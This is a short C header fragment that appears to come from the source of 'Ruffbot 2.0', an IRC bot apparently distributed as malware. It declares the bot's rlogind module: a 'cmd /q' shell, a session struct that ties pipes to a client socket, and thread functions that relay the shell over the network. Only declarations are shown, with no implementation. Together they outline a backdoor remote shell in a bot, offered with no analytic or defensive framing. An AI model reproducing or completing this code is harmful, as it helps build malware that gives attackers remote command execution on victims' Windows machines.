/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#ifndef NO_RLOGIND

#define BUFFER_SIZE 200
#define SHELL_COMMAND_LINE  TEXT("cmd /q")

#define CHAR_BS		0010
#define CHAR_DEL	0177
#define CHAR_CTRL_C	0003
#define CHAR_CTRL_U	0025

typedef struct SESSION_DATA 
{
    HANDLE ReadPipeHandle;
    HANDLE WritePipeHandle;
    HANDLE ProcessHandle;
    SOCKET ClientSocket;
    HANDLE ReadShellThreadHandle;
    HANDLE WriteShellThreadHandle;

} SESSION_DATA, *PSESSION_DATA;

static PSESSION_DATA CreateSession(int threadnum);
BOOL SessionRun(int threadnum);
static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle, int threadnum);
static void SessionReadShellThread(LPVOID param);
static void SessionWriteShellThread(LPVOID param);
#endif
